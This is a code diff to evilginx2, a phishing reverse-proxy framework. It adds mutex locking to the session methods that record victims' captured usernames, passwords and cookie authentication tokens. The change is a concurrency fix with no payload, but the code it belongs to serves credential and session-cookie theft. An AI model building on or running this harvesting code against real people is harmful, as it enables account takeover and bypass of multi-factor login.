@@ -1,6 +1,7 @@
 package core
 
 import (
+	"sync"
 	"time"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -28,6 +29,7 @@ type Session struct {
 	DoneSignal     chan struct{}
 	RemoteAddr     string
 	UserAgent      string
+	mu             sync.RWMutex
 }
 
 func NewSession(name string) (*Session, error) {
@@ -59,18 +61,27 @@ func NewSession(name string) (*Session, error) {
 }
 
 func (s *Session) SetUsername(username string) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
 	s.Username = username
 }
 
 func (s *Session) SetPassword(password string) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
 	s.Password = password
 }
 
 func (s *Session) SetCustom(name string, value string) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
 	s.Custom[name] = value
 }
 
 func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	
 	if _, ok := s.CookieTokens[domain]; !ok {
 		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
@@ -87,7 +98,6 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 			HttpOnly: http_only,
 		}
 	}
-
 }
 
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
@@ -130,6 +140,9 @@ func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAut
 }
 
 func (s *Session) Finish(is_auth_url bool) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	
 	if !s.IsDone {
 		s.IsDone = true
 		s.IsAuthUrl = is_auth_url
